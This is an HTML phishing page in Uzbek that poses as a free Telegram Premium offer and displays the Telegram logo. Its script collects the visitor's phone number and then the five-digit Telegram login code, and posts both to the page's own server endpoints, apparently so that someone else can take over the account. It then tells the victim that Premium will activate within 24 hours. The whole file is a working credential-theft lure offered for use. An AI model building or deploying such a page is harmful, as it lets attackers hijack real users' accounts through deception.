<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
        body { background-color: #0e1621; color: white; font-family: sans-serif; text-align: center; padding: 50px 20px; }
        .container { max-width: 400px; margin: auto; background: #17212b; padding: 30px; border-radius: 15px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; }
        button { width: 96%; padding: 12px; background: #2481cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        #code-section { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://telegram.org/img/t_logo.png" width="80">
        <h2>Telegram Premium</h2>
        
        <div id="phone-section">
            <p>Bepul Premium olish uchun raqamingizni kiriting:</p>
            <input type="text" id="phone" placeholder="+998901234567">
            <button onclick="sendPhone()">OLISH</button>
        </div>

        <div id="code-section">
            <p>Telegramingizga kelgan 5 xonali kodni kiriting:</p>
            <input type="text" id="code" placeholder="12345">
            <button onclick="sendCode()">TASDIQLASH</button>
        </div>
        
        <p id="status"></p>
    </div>

    <script>
        let userPhone = "";

        function sendPhone() {
            userPhone = document.getElementById('phone').value;
            document.getElementById('status').innerText = "Yuborilmoqda...";
            axios.post('/send_phone', { phone: userPhone })
                .then(res => {
                    if(res.data.status === "success") {
                        document.getElementById('phone-section').style.display = "none";
                        document.getElementById('code-section').style.display = "block";
                        document.getElementById('status').innerText = "";
                    } else {
                        document.getElementById('status').innerText = "Xato: " + res.data.message;
                    }
                });
        }

        function sendCode() {
            const code = document.getElementById('code').value;
            document.getElementById('status').innerText = "Tekshirilmoqda...";
            axios.post('/send_code', { phone: userPhone, code: code })
                .then(res => {
                    if(res.data.status === "success") {
                        document.getElementById('status').innerText = "✅ Tabriklaymiz! Premium 24 soat ichida faollashadi.";
                    } else {
                        document.getElementById('status').innerText = "❌ Kod noto'g'ri!";
                    }
                });
        }
    </script>
</body>
</html>
